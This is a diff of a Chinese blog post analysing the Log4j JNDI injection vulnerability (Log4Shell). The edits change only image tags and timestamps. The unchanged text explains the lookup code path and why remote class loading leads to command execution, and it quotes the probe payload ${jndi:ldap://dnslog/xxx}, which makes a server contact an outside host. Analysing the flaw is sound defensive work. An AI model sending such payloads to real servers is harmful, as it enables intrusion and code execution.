@@ -31,6 +31,8 @@
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B1%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B2%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B3%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B4%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B5%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B6%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B7%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B8%5D.png">
@@ -41,6 +43,7 @@
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B13%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B14%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B15%5D.png">
+<meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B16%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B17%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B18%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B19%5D.png">
@@ -48,7 +51,7 @@
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B21%5D.png">
 <meta property="og:image" content="http://yoursite.com/images/211210/Image%20%5B22%5D.png">
 <meta property="article:published_time" content="2021-12-15T08:11:04.000Z">
-<meta property="article:modified_time" content="2021-12-17T09:18:38.576Z">
+<meta property="article:modified_time" content="2021-12-17T09:23:21.553Z">
 <meta property="article:author" content="0xSky">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/images/211210/Image%20.png">
@@ -201,7 +204,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-17 17:18:38" itemprop="dateModified" datetime="2021-12-17T17:18:38+08:00">2021-12-17</time>
+                <time title="修改时间：2021-12-17 17:23:21" itemprop="dateModified" datetime="2021-12-17T17:23:21+08:00">2021-12-17</time>
               </span>
 
           
@@ -230,8 +233,8 @@
 <p>因此，网上部分文章说的引入依赖就算被影响实际上是不准确、不严谨的。虽然这样写可以吸引眼球，引起重视，但是也对漏洞影响排查造成了干扰，并不可取。</p>
 <p>作为技术从业者，我们不要听风就是雨，对于漏洞应小心求证，细心排查，严谨处理。当然这个漏洞的影响还是极其巨大的，作为一种软件的”基础设施“，有许多的组件都使用了它作为日志实现，例如 es、Struts2、Solr 等等众多组件与服务。</p>
 <p>再补上一个受影响的 log4j 进行日志记录，手动使用 log4j 处理日志，这样就由 log4j 进行日志处理了：</p>
-<p>![](/images/211210/Image [4].png)</p>
-<p>![](/images/211210/Image [5].png)</p>
+<p><img src="/images/211210/Image%20%5B4%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B5%5D.png" alt=""></p>
 <h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>网络上流传最广的是使用 JNDI 进行 LDAP DNS 查询来确定是否受漏洞影响的 PoC（${jndi:ldap://dnslog/xxx}），根据这个 PoC 我们可以简单判定是因为 JNDI LDAP 查询远程 class 并进行加载造成了攻击。</p>
 <p>这个漏洞实际上是官方支持的一种功能，官方支持在日志设置时使用 ${xxx} 进行动态设置（<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener">官网描述</a>），并且支持日志输出时使用如 log.info(“${sys:java.version}) 动态获取并输出一些内容。而后面这个功能也支持 JNDI 协议，所以暴露在了 JNDI 注入攻击（JNDI 远程类加载攻击）之中。</p>
 <p>这里简单介绍一下这种攻击，JNDI 全称为 Java Naming and Directory Interface，是一种类似于索引中心的API功能，可以用于实现动态配置的功能。当代码中 jndiName 变量可控时，发起查询的客户端就会从服务端加载远程 class 文件，最终导致命令执行。</p>
@@ -266,7 +269,7 @@
 <p>言归正传，后续调用 substitute 递归解析文本中的变量值，注释中也有说明。</p>
 <p><img src="/images/211210/Image%20%5B15%5D.png" alt=""></p>
 <p>resolveVariable 进行具体的变量解析，后续就是 lookup 调用，在这里 jndiName 已经被输入完全控制。最终调用了 JAVA 的 lookup，所以也受 JAVA 环境限制。</p>
-<p>![](/images/211210/Image [16].png)</p>
+<p><img src="/images/211210/Image%20%5B16%5D.png" alt=""></p>
 <p><img src="/images/211210/Image%20%5B17%5D.png" alt=""></p>
 <p>上述的操作在 JAVA 1.8_191 前因为默认信任外部 codebase 是可以进行的，在 JAVA 1.8_191 后不再信任外部 codebase 所以使用外部类不再可行，许多的通告中都提到了这一点。但是本地存在的类还是可以利用的，而 Spring Boot 默认带有 tomcat 依赖，可以通过这种类似的本地类执行代码，还是比较容易利用的，可以参考<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>和[dubbo反序列化（CVE-2020-1948）可用链路学习中的利用。</p>
 <h4 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h4><p>根据前文内容我们可以简单得出一些临时解决方式</p>
